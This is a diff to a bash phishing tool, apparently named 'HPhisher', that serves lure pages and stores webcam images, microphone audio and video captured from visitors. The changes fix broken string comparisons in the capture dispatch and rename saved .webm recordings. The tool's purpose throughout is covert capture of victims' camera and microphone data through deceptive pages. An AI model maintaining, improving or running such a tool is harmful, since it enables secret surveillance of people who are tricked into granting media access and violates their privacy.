@@ -462,13 +462,13 @@ setup_site() {
 
 #Capture data check
 capture_data_check(){
-	if [ type=image ];then
+	if [ ${type} == "image" ];then
                 capture_data_image
-        elif [ type=audio ];then
+        elif [ ${type} == "audio" ];then
                 capture_data_audio
-        elif [ type=video ];then
+        elif [ ${type} == "video" ];then
                 capture_data_video
-	elif [ type=both ];then
+	elif [ ${type} == "both" ];then
                capture_data_video_audio
 	else
 	    	echo " Error Occured!!"
@@ -617,7 +617,7 @@ capture_data_video() {
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
                         rm -rf Log.log
-                        mv .server/www/*.webm  ${logs_full_dir}/
+                        mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
                 fi
                 sleep 0.5
 	done
@@ -649,19 +649,19 @@ read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
 echo " "
 case $reply_site in
         1 | 01)
-		type=image
+		type="image"
 		site_name=image
                 site_image;;
         2 | 02)
-		type=audio
+		type="audio"
 		site_name=audio
                 site_audio;;
 	3 | 03)
-		type=video
+		type="video"
 		site_name=video
                 site_video;;
 	4 | 04)
-		type=both
+		type="both"
 		site_name=video
 		site_video_audio;;
 	A | a)
